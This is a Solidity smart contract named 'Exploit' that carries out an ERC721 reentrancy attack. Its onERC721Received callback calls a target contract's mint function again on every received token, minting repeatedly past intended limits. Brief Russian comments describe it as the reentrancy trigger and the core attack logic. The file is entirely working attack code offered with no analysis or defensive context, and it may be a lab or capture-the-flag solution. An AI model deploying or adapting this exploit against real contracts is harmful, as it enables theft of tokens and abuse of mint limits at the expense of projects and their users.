pragma solidity 0.8.7;

interface IERC721Receiver {
  /**
   * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
   * by `operator` from `from`, this function is called.
   *
   * It must return its Solidity selector to confirm the token transfer.
   * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
   *
   * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
   */
  function onERC721Received(
      address operator,
      address from,
      uint256 tokenId,
      bytes calldata data
  ) external returns (bytes4);
}

interface ITarget {
	function mint(uint amount) external;
}

contract Exploit is IERC721Receiver {
	ITarget private target;
  	uint private maxMints;
	address private owner;
  constructor(address _target, uint _maxMints) {
    target = ITarget(_target);
    maxMints = _maxMints;
    owner = msg.sender;
  }

  function exploit() external {
	require(owner == msg.sender);
    	target.mint(maxMints); // тригерим реетранси erc721
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) { // переопределяем каллбек, где реализована основная логика атаки erc721 reentrancy
	  	if (maxMints > 0) {
          maxMints -= 1;
      		target.mint(maxMints); // перебираем все токены, отчеканивая их раз за разом
    	}
    	return this.onERC721Received.selector;
  }
}
